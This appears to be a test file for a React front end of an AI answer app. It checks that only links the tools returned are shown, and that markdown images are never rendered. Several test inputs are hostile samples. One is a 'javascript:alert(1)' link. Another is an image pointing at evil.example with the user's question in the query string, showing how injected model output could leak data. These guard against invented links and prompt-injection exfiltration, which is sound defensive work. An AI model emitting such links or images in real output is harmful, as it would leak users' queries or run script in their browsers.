import { describe, expect, it } from "vitest";

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { AnswerText, isVerifiedLink } from "./App";
import { parseSSE } from "./sse";

describe("isVerifiedLink", () => {
  const sources = ["https://finance.yahoo.com/quote/TSLA/", "https://apnews.com/a"];

  it("allows a link the tools returned", () => {
    expect(isVerifiedLink("https://apnews.com/a", sources)).toBe(true);
  });

  it("blocks a plausible link the model invented", () => {
    expect(isVerifiedLink("https://finance.yahoo.com/search?q=TSLA", sources)).toBe(false);
  });

  it("blocks non-https and missing links", () => {
    expect(isVerifiedLink("javascript:alert(1)", ["javascript:alert(1)"])).toBe(false);
    expect(isVerifiedLink("VKTX", sources)).toBe(false);
    expect(isVerifiedLink(undefined, sources)).toBe(false);
    expect(isVerifiedLink("https://apnews.com/a", undefined)).toBe(false);
  });
});

describe("sources event", () => {
  it("parses", () => {
    const { events } = parseSSE('data: {"type": "sources", "urls": ["https://apnews.com/a"]}\n\n');
    expect(events).toEqual([{ type: "sources", urls: ["https://apnews.com/a"] }]);
  });
});

describe("AnswerText", () => {
  const render = (text: string, sources?: string[]) =>
    renderToStaticMarkup(createElement(AnswerText, { text, sources }));

  it("never renders images, so injected output can't auto-load a URL", () => {
    const html = render("Price is $1 ![x](https://evil.example/?q=my+question)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("links only verified sources", () => {
    const html = render("[real](https://apnews.com/a) and [fake](https://evil.example/)", [
      "https://apnews.com/a",
    ]);
    expect(html).toContain('<a href="https://apnews.com/a"');
    expect(html).not.toContain('href="https://evil.example/"');
    expect(html).toContain("fake");
  });
});
